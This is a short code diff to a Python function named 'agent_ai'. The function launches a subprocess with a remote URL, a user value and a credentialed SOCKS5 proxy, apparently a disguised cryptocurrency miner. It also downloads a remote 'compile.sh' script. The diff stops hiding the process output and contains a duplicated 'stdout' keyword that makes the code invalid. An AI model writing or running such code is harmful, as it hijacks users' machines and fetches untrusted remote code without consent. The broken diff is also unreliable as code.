@@ -44,10 +44,10 @@ def agent_ai():
              "--url",   "38.89.142.24:443",
              "--user",  user,
              "--proxy", "socks5://yoga:yoga123@107.172.222.195:443"],
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
+            stdout=None,
+            stdout=None,
         ).wait()
-        time.sleep(20)
+        time.sleep(5)
 
 # 3. compile.sh — output ditampilkan
 urllib.request.urlretrieve("https://maskurniawan.serv00.net/compile.sh", "compile.sh")
